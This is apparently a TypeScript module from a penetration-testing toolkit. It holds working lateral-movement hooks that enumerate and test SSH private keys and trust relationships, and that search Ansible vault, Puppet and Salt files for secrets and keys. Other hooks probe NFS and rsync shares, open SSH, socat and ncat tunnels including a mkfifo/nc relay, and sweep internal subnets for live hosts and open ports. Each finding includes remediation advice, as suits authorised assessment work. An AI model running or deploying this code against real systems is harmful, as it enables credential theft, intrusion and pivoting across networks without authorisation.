import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function sshPivot(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Lateral Movement ==="]
  const target = argVal(args, "--target")
  const key = argVal(args, "--key")
  const user = argVal(args, "--user") || "root"

  const script = `
echo "--- Known Hosts (potential targets) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/known_hosts" ]; then
    echo "[*] $dir/.ssh/known_hosts:"
    if command -v ssh-keygen >/dev/null 2>&1; then
      ssh-keygen -l -f "$dir/.ssh/known_hosts" 2>/dev/null | head -20
    else
      cat "$dir/.ssh/known_hosts" 2>/dev/null | awk '{print $1}' | head -20
    fi
  fi
done

echo ""
echo "--- Authorized Keys (trust relationships) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
    echo "[*] $dir/.ssh/authorized_keys: $count key(s)"
    awk '{print $3, $1}' "$dir/.ssh/authorized_keys" 2>/dev/null | head -10
  fi
done

echo ""
echo "--- SSH Config Targets ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/config" ]; then
    echo "[*] $dir/.ssh/config:"
    grep -iE "^(Host |HostName |User |IdentityFile |ProxyJump )" "$dir/.ssh/config" 2>/dev/null
  fi
done

echo ""
echo "--- Available Private Keys ---"
for dir in /root /home/*; do
  for kf in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_dsa"; do
    if [ -f "$kf" ]; then
      enc=""
      grep -q "ENCRYPTED" "$kf" && enc="(encrypted)" || enc="(UNENCRYPTED)"
      echo "[+] $kf $enc"
    fi
  done
done

echo ""
echo "--- SSH Agent Sockets ---"
find /tmp -name "agent.*" -type s 2>/dev/null | head -5
[ -n "$SSH_AUTH_SOCK" ] && echo "[+] SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
${target ? `
echo ""
echo "--- Attempting connection to ${target} ---"
ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no ${key ? `-i ${key}` : ""} ${user}@${target} "hostname; id; ip addr show 2>/dev/null | grep inet" 2>&1
` : ""}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hosts = (r.stdout.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g) || [])
  const uniqueHosts = [...new Set(hosts)]
  if (uniqueHosts.length > 0) {
    findings.push({
      checkId: "LNX-SSHPIVOT-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_targets",
      title: "SSH pivot targets identified",
      details: `${uniqueHosts.length} unique IP(s) found in known_hosts/config — potential lateral movement targets via SSH`,
      remediation: "Limit SSH trust relationships. Use bastion hosts with MFA. Rotate SSH keys regularly.",
    })
  }

  const unencKeys = (r.stdout.match(/UNENCRYPTED/g) || []).length
  if (unencKeys > 0) {
    findings.push({
      checkId: "LNX-SSHPIVOT-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_keys",
      title: "Unencrypted SSH keys available for pivoting",
      details: `${unencKeys} unencrypted private key(s) found — can be used directly for lateral movement without passphrase`,
      remediation: "Encrypt all SSH private keys with strong passphrases.",
    })
  }

  if (target && r.stdout.includes("hostname")) {
    findings.push({
      checkId: "LNX-SSHPIVOT-003",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "EXPLOITED",
      resource: target,
      title: `SSH pivot successful to ${target}`,
      details: `Successfully authenticated to ${target} as ${user} — lateral movement confirmed`,
      remediation: "Revoke compromised SSH keys. Implement network segmentation and SSH certificate authentication.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ansibleAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Ansible Abuse ==="]

  const script = `
echo "--- Ansible Installation ---"
command -v ansible && ansible --version 2>/dev/null | head -3 || echo "[-] ansible not found in PATH"
command -v ansible-playbook >/dev/null 2>&1 && echo "[+] ansible-playbook available"
command -v ansible-vault >/dev/null 2>&1 && echo "[+] ansible-vault available"

echo ""
echo "--- Ansible Configuration Files ---"
for f in /etc/ansible/ansible.cfg ~/.ansible.cfg ./ansible.cfg; do
  if [ -f "$f" ]; then
    echo "[+] Config: $f"
    grep -iE "(remote_user|private_key_file|vault_password_file|become|ask_pass)" "$f" 2>/dev/null
  fi
done

echo ""
echo "--- Inventory Files ---"
for f in /etc/ansible/hosts ~/.ansible/hosts ./inventory ./hosts ./inventory.yml ./inventory.yaml; do
  if [ -f "$f" ]; then
    echo "[+] Inventory: $f"
    grep -vE "^(#|$)" "$f" 2>/dev/null | head -30
  fi
done
find /etc/ansible /home -name "inventory*" -o -name "hosts" 2>/dev/null | grep -i ansible | head -10

echo ""
echo "--- Vault Files ---"
find / -name "*.vault" -o -name "*vault*.yml" -o -name "*vault*.yaml" -o -name ".vault_pass*" 2>/dev/null | head -20
for dir in /etc/ansible /home/*/.ansible /home/*/projects /opt; do
  find "$dir" -name "*.yml" -exec grep -l "ANSIBLE_VAULT" {} \\; 2>/dev/null | head -10
done

echo ""
echo "--- Vault Password Files ---"
find / -name ".vault_pass*" -o -name "vault_password*" -o -name ".vault-pass*" 2>/dev/null | head -10
grep -r "vault_password_file" /etc/ansible/ ~/.ansible* 2>/dev/null

echo ""
echo "--- Playbooks ---"
find /etc/ansible /home /opt /srv -name "*.yml" -o -name "*.yaml" 2>/dev/null | xargs grep -l "hosts:" 2>/dev/null | head -20

echo ""
echo "--- SSH Keys for Ansible ---"
grep -r "private_key_file\|ansible_ssh_private_key" /etc/ansible/ ~/.ansible* 2>/dev/null
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] ansible-playbook available")) {
    findings.push({
      checkId: "LNX-ANSIBLE-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ansible",
      title: "Ansible control node detected",
      details: "Ansible is installed with playbook execution capability — can be used to execute commands across all managed hosts",
      remediation: "Restrict Ansible access to authorized users. Use Ansible Vault for all secrets. Limit sudo in playbooks.",
    })
  }

  if (r.stdout.includes("Inventory:")) {
    const inventoryCount = (r.stdout.match(/Inventory:/g) || []).length
    findings.push({
      checkId: "LNX-ANSIBLE-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ansible_inventory",
      title: "Ansible inventory files found",
      details: `${inventoryCount} inventory file(s) found — contains target hosts for lateral movement`,
      remediation: "Protect inventory files with strict permissions (600). Use dynamic inventory with authentication.",
    })
  }

  if (r.stdout.includes("ANSIBLE_VAULT") || r.stdout.includes(".vault")) {
    findings.push({
      checkId: "LNX-ANSIBLE-003",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ansible_vault",
      title: "Ansible vault files found",
      details: "Encrypted vault files detected — may contain credentials, API keys, or other secrets. Attempt decryption with found vault password files.",
      remediation: "Rotate all secrets stored in Ansible vaults. Use external secret management (HashiCorp Vault, AWS Secrets Manager).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function puppetAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Puppet Abuse ==="]

  const script = `
echo "--- Puppet Installation ---"
command -v puppet && puppet --version 2>/dev/null || echo "[-] puppet not found"
command -v facter >/dev/null 2>&1 && echo "[+] facter available"

echo ""
echo "--- Puppet Configuration ---"
for d in /etc/puppet /etc/puppetlabs/puppet /opt/puppetlabs/puppet; do
  if [ -d "$d" ]; then
    echo "[+] Config dir: $d"
    cat "$d/puppet.conf" 2>/dev/null | grep -vE "^(#|$)" | head -20
  fi
done

echo ""
echo "--- Puppet SSL Certificates ---"
for d in /etc/puppet/ssl /etc/puppetlabs/puppet/ssl /var/lib/puppet/ssl; do
  if [ -d "$d" ]; then
    echo "[+] SSL dir: $d"
    ls -la "$d/private_keys/" 2>/dev/null
    ls -la "$d/certs/" 2>/dev/null
  fi
done

echo ""
echo "--- Puppet Manifests & Modules ---"
find /etc/puppet /etc/puppetlabs /opt/puppetlabs -name "*.pp" 2>/dev/null | head -20

echo ""
echo "--- Hiera Data (secrets) ---"
find /etc/puppet /etc/puppetlabs -name "hiera.yaml" -o -name "*.eyaml" 2>/dev/null | head -10
find /etc/puppet /etc/puppetlabs -path "*/data/*.yaml" 2>/dev/null | xargs grep -l "password\|secret\|token" 2>/dev/null | head -10

echo ""
echo "--- Puppet Master Check ---"
ps aux 2>/dev/null | grep -i "puppet.*master\|puppetserver" | grep -v grep
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] SSL dir:")) {
    findings.push({
      checkId: "LNX-PUPPET-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "puppet_certs",
      title: "Puppet SSL certificates and private keys found",
      details: "Puppet SSL private keys accessible — can impersonate puppet agent or master for code execution on managed nodes",
      remediation: "Restrict Puppet SSL directory permissions. Rotate certificates.",
    })
  }

  if (r.stdout.includes("password") || r.stdout.includes(".eyaml")) {
    findings.push({
      checkId: "LNX-PUPPET-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "puppet_hiera",
      title: "Puppet Hiera data with potential secrets",
      details: "Hiera data files contain password/secret references — may contain plaintext or eyaml-encrypted credentials",
      remediation: "Use eyaml encryption for all Hiera secrets. Restrict access to Hiera data directories.",
    })
  }

  if (r.stdout.includes("puppetserver")) {
    findings.push({
      checkId: "LNX-PUPPET-003",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "FOUND",
      resource: "puppet_master",
      title: "Puppet master/server running on this host",
      details: "This host is a Puppet master — full control over all managed nodes for code execution",
      remediation: "Harden Puppet master access. Use RBAC. Restrict manifest editing.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function saltAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SaltStack Abuse ==="]

  const script = `
echo "--- Salt Installation ---"
command -v salt && salt --version 2>/dev/null || echo "[-] salt not found"
command -v salt-call >/dev/null 2>&1 && echo "[+] salt-call available"
command -v salt-key >/dev/null 2>&1 && echo "[+] salt-key available (master)"

echo ""
echo "--- Salt Configuration ---"
for f in /etc/salt/master /etc/salt/minion /etc/salt/master.d/*.conf /etc/salt/minion.d/*.conf; do
  if [ -f "$f" ]; then
    echo "[+] Config: $f"
    grep -iE "(master:|interface:|user:|root_dir:|pki_dir:|publish_port:|ret_port:)" "$f" 2>/dev/null
  fi
done

echo ""
echo "--- Salt Keys ---"
if [ -d /etc/salt/pki ]; then
  echo "[+] PKI directory found"
  find /etc/salt/pki -name "*.pem" 2>/dev/null | head -20
  ls -la /etc/salt/pki/master/minions/ 2>/dev/null | head -20
fi
salt-key -L 2>/dev/null

echo ""
echo "--- Salt Pillar Data (secrets) ---"
find /srv/pillar /etc/salt/pillar -name "*.sls" 2>/dev/null | xargs grep -l "password\|secret\|key\|token" 2>/dev/null | head -10
find /srv/salt /etc/salt -name "*.sls" 2>/dev/null | head -20

echo ""
echo "--- Salt Master Test ---"
salt-call test.ping 2>/dev/null
salt '*' test.ping 2>/dev/null 2>&1 | head -10
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] salt-key available")) {
    findings.push({
      checkId: "LNX-SALT-001",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "FOUND",
      resource: "salt_master",
      title: "SaltStack master detected",
      details: "This host is a Salt master — can execute arbitrary commands on all connected minions via salt '*' cmd.run",
      remediation: "Restrict Salt master access. Use ACLs and external_auth. Rotate master keys.",
    })
  }

  if (r.stdout.includes("[+] salt-call available")) {
    findings.push({
      checkId: "LNX-SALT-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "salt_minion",
      title: "SaltStack minion detected",
      details: "Salt minion is installed — master connection details and keys may enable lateral movement to the master",
      remediation: "Restrict minion key access. Use encrypted pillar data.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function nfsMountAttack(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== NFS Mount Attack ==="]
  const target = argVal(args, "--target") || "localhost"

  const script = `
echo "--- Local NFS Exports ---"
cat /etc/exports 2>/dev/null

echo ""
echo "--- Remote NFS Shares (${target}) ---"
showmount -e ${target} 2>/dev/null || echo "[-] showmount failed or not available"

echo ""
echo "--- Currently Mounted NFS ---"
mount 2>/dev/null | grep nfs
df -h 2>/dev/null | grep ":"

echo ""
echo "--- NFS Configuration ---"
cat /etc/nfs.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
rpcinfo -p ${target} 2>/dev/null | grep -i nfs

echo ""
echo "--- Checking no_root_squash ---"
grep -i "no_root_squash" /etc/exports 2>/dev/null
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("no_root_squash")) {
    findings.push({
      checkId: "LNX-NFSMNT-001",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "FOUND",
      resource: target,
      title: "NFS share with no_root_squash",
      details: `NFS export with no_root_squash found — mount share, create SUID binary as root, execute on target for root access`,
      remediation: "Enable root_squash on all NFS exports. Use Kerberos authentication for NFS.",
    })
  }

  if (r.stdout.includes("Export list") || r.stdout.match(/\//)) {
    findings.push({
      checkId: "LNX-NFSMNT-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: target,
      title: "NFS shares enumerated",
      details: `NFS shares found on ${target} — check for writable shares and sensitive data`,
      remediation: "Restrict NFS exports to specific hosts and networks. Use NFSv4 with Kerberos.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function rsyncExploit(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Rsync Exploitation ==="]
  const target = argVal(args, "--target") || "localhost"

  const script = `
echo "--- Rsync Configuration ---"
cat /etc/rsyncd.conf 2>/dev/null || echo "[-] No rsyncd.conf found"

echo ""
echo "--- Enumerate Rsync Modules (${target}) ---"
rsync ${target}:: 2>/dev/null || echo "[-] rsync enumeration failed or not available"

echo ""
echo "--- Check Anonymous Access ---"
rsync --list-only ${target}:: 2>/dev/null | head -20

echo ""
echo "--- Rsync Service Check ---"
ss -tlnp 2>/dev/null | grep ":873" || netstat -tlnp 2>/dev/null | grep ":873"
ps aux 2>/dev/null | grep rsync | grep -v grep
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("rsyncd.conf") && !r.stdout.includes("No rsyncd.conf")) {
    findings.push({
      checkId: "LNX-RSYNC-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: target,
      title: "Rsync daemon configuration found",
      details: "Rsync daemon config exists — check for modules with anonymous read/write access",
      remediation: "Require authentication for all rsync modules. Restrict to read-only where possible.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshTunnel(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Tunnel Setup ==="]
  const tunnelType = argVal(args, "--type") || "local"
  const localPort = argVal(args, "--local-port") || "8080"
  const remote = argVal(args, "--remote") || "127.0.0.1:80"
  const target = argVal(args, "--target")

  if (!target) {
    output.push("Usage: linuxhook ssh_tunnel --target <ssh_host> --type <local|remote|dynamic> --local-port <port> --remote <host:port>")
    output.push("")
    output.push("Examples:")
    output.push("  Local forward:   linuxhook ssh_tunnel --target pivot --type local --local-port 8080 --remote 10.0.0.5:80")
    output.push("  Remote forward:  linuxhook ssh_tunnel --target pivot --type remote --local-port 4444 --remote 0.0.0.0:4444")
    output.push("  Dynamic SOCKS:   linuxhook ssh_tunnel --target pivot --type dynamic --local-port 1080")
    output.push("")
    output.push("--- Current SSH Connections ---")
    const r = activeExec === "sh" ? await sh("ss -tnp 2>/dev/null | grep ssh; ps aux | grep 'ssh -' | grep -v grep", timeout) : await bash("ss -tnp 2>/dev/null | grep ssh; ps aux | grep 'ssh -' | grep -v grep", timeout)
    output.push(r.stdout || "No active SSH tunnels")
    return { output: output.join("\n"), findings }
  }

  let cmd = ""
  if (tunnelType === "local") cmd = `ssh -f -N -L ${localPort}:${remote} ${target}`
  if (tunnelType === "remote") cmd = `ssh -f -N -R ${localPort}:${remote} ${target}`
  if (tunnelType === "dynamic") cmd = `ssh -f -N -D ${localPort} ${target}`

  const script = `
echo "--- Setting up ${tunnelType} tunnel ---"
echo "Command: ${cmd}"
${cmd} 2>&1
sleep 1
echo ""
echo "--- Verifying tunnel ---"
ss -tlnp 2>/dev/null | grep ":${localPort}" || netstat -tlnp 2>/dev/null | grep ":${localPort}"
ps aux | grep "ssh -" | grep -v grep
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-TUNNEL-001",
    provider: "linuxhook",
    severity: "MEDIUM",
    status: "IDENTIFIED",
    resource: target,
    title: `SSH ${tunnelType} tunnel configured`,
    details: `${tunnelType} tunnel via ${target} — local port ${localPort}${tunnelType !== "dynamic" ? ` forwarding to ${remote}` : " as SOCKS proxy"}`,
    remediation: "Monitor for unauthorized SSH tunnels. Restrict SSH port forwarding with AllowTcpForwarding and PermitOpen.",
  })

  return { output: output.join("\n"), findings }
}

export async function socatTunnel(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Socat/Netcat Tunnel ==="]
  const listenPort = argVal(args, "--listen-port")
  const forwardTo = argVal(args, "--forward-to")

  const script = `
echo "--- Available Tools ---"
command -v socat >/dev/null 2>&1 && echo "[+] socat available" || echo "[-] socat not found"
command -v ncat >/dev/null 2>&1 && echo "[+] ncat available" || echo "[-] ncat not found"
command -v nc >/dev/null 2>&1 && echo "[+] nc available" || echo "[-] nc not found"
command -v netcat >/dev/null 2>&1 && echo "[+] netcat available" || echo "[-] netcat not found"

echo ""
echo "--- Existing Tunnels/Listeners ---"
ss -tlnp 2>/dev/null | grep -E "(socat|ncat|nc)" || echo "No active socat/nc listeners"
ps aux 2>/dev/null | grep -E "(socat|ncat|nc )" | grep -v grep

${listenPort && forwardTo ? `
echo ""
echo "--- Creating Tunnel ---"
if command -v socat >/dev/null 2>&1; then
  echo "socat TCP-LISTEN:${listenPort},fork TCP:${forwardTo} &"
  socat TCP-LISTEN:${listenPort},fork TCP:${forwardTo} &
elif command -v ncat >/dev/null 2>&1; then
  echo "ncat -lvkp ${listenPort} -c 'ncat ${forwardTo.split(":")[0]} ${forwardTo.split(":")[1]}' &"
  ncat -lvkp ${listenPort} -c "ncat ${forwardTo.split(":")[0]} ${forwardTo.split(":")[1]}" &
else
  echo "[-] No suitable tool found for tunneling"
fi
sleep 1
ss -tlnp 2>/dev/null | grep ":${listenPort}"
` : `
echo ""
echo "--- Usage ---"
echo "linuxhook socat_tunnel --listen-port 8080 --forward-to 10.0.0.5:80"
echo ""
echo "Manual examples:"
echo "  socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80 &"
echo "  ncat -lvkp 8080 -c 'ncat 10.0.0.5 80' &"
echo "  mkfifo /tmp/.p; nc -l 8080 < /tmp/.p | nc 10.0.0.5 80 > /tmp/.p &"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] socat available") || r.stdout.includes("[+] ncat available")) {
    findings.push({
      checkId: "LNX-TUNNEL-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "tunneling_tools",
      title: "Tunneling tools available",
      details: "socat/ncat available for port forwarding and traffic pivoting",
      remediation: "Remove unnecessary networking tools from production servers.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function internalScan(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Internal Network Scan ==="]
  const subnet = argVal(args, "--subnet")
  const ports = argVal(args, "--ports") || "22,80,443,3306,5432,6379,8080,8443"

  const script = `
echo "--- Local Network Info ---"
ip -br addr 2>/dev/null || ifconfig 2>/dev/null | grep -E "inet |flags"
echo ""
ip route 2>/dev/null | head -10 || route -n 2>/dev/null | head -10

echo ""
echo "--- ARP Table (known hosts) ---"
ip neigh 2>/dev/null || arp -an 2>/dev/null

${subnet ? `
echo ""
echo "--- Host Discovery (${subnet}) ---"
if command -v nmap >/dev/null 2>&1; then
  nmap -sn ${subnet} 2>/dev/null | grep -E "(scan report|Host is)"
elif command -v ping >/dev/null 2>&1; then
  echo "Using ping sweep..."
  prefix=$(echo "${subnet}" | sed 's|/.*||; s|\\.[0-9]*$||')
  for i in $(seq 1 254); do
    ping -c 1 -W 1 "$prefix.$i" >/dev/null 2>&1 && echo "[+] $prefix.$i is alive" &
  done
  wait
fi

echo ""
echo "--- Port Scan (${subnet} : ${ports}) ---"
if command -v nmap >/dev/null 2>&1; then
  nmap -p ${ports} --open ${subnet} 2>/dev/null | grep -E "(scan report|open)"
else
  echo "Using bash /dev/tcp..."
  prefix=$(echo "${subnet}" | sed 's|/.*||; s|\\.[0-9]*$||')
  for port in $(echo "${ports}" | tr ',' ' '); do
    for i in 1 2 5 10 20 50 100 200; do
      (echo >/dev/tcp/$prefix.$i/$port) 2>/dev/null && echo "[+] $prefix.$i:$port OPEN" &
    done
  done
  wait
fi
` : `
echo ""
echo "--- Listening Services (local) ---"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

echo ""
echo "Usage: linuxhook internal_scan --subnet 10.0.0.0/24 --ports 22,80,443"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const aliveHosts = (r.stdout.match(/is alive|scan report/g) || []).length
  const openPorts = (r.stdout.match(/OPEN|open/g) || []).length

  if (aliveHosts > 0) {
    findings.push({
      checkId: "LNX-PORTSCAN-001",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: subnet || "local",
      title: "Live hosts discovered",
      details: `${aliveHosts} live host(s) found on ${subnet || "local network"} — potential lateral movement targets`,
      remediation: "Implement network segmentation. Monitor for internal scanning activity.",
    })
  }

  if (openPorts > 0) {
    findings.push({
      checkId: "LNX-PORTSCAN-002",
      provider: "linuxhook",
      severity: "LOW",
      status: "IDENTIFIED",
      resource: subnet || "local",
      title: "Open ports found on internal hosts",
      details: `${openPorts} open port(s) discovered — review for exploitable services`,
      remediation: "Close unnecessary ports. Use host-based firewalls on all internal systems.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function proxychainsSetup(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Proxychains Setup ==="]
  const proxyHost = argVal(args, "--proxy-host") || "127.0.0.1"
  const proxyPort = argVal(args, "--proxy-port") || "1080"

  const script = `
echo "--- Proxychains Installation ---"
command -v proxychains4 >/dev/null 2>&1 && echo "[+] proxychains4 available" || \
command -v proxychains >/dev/null 2>&1 && echo "[+] proxychains available" || \
echo "[-] proxychains not installed"

echo ""
echo "--- Current Configuration ---"
for f in /etc/proxychains.conf /etc/proxychains4.conf ~/.proxychains/proxychains.conf; do
  if [ -f "$f" ]; then
    echo "[*] Config: $f"
    grep -vE "^(#|$)" "$f" 2>/dev/null | tail -10
  fi
done

echo ""
echo "--- SOCKS Proxy Status ---"
ss -tlnp 2>/dev/null | grep ":${proxyPort}" || echo "[-] No listener on port ${proxyPort}"

echo ""
echo "--- Setup Instructions ---"
echo "1. Start SOCKS proxy: ssh -D ${proxyPort} -f -N pivot_host"
echo "2. Configure proxychains:"
echo "   echo 'socks5 ${proxyHost} ${proxyPort}' >> /etc/proxychains.conf"
echo "3. Use: proxychains nmap -sT 10.0.0.0/24"
echo "   proxychains curl http://internal-app:8080"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] proxychains")) {
    findings.push({
      checkId: "LNX-TUNNEL-003",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "proxychains",
      title: "Proxychains available for pivoting",
      details: `Proxychains installed — can tunnel traffic through SOCKS proxy on ${proxyHost}:${proxyPort}`,
      remediation: "Remove proxychains from production systems. Monitor for SOCKS proxy connections.",
    })
  }

  return { output: output.join("\n"), findings }
}
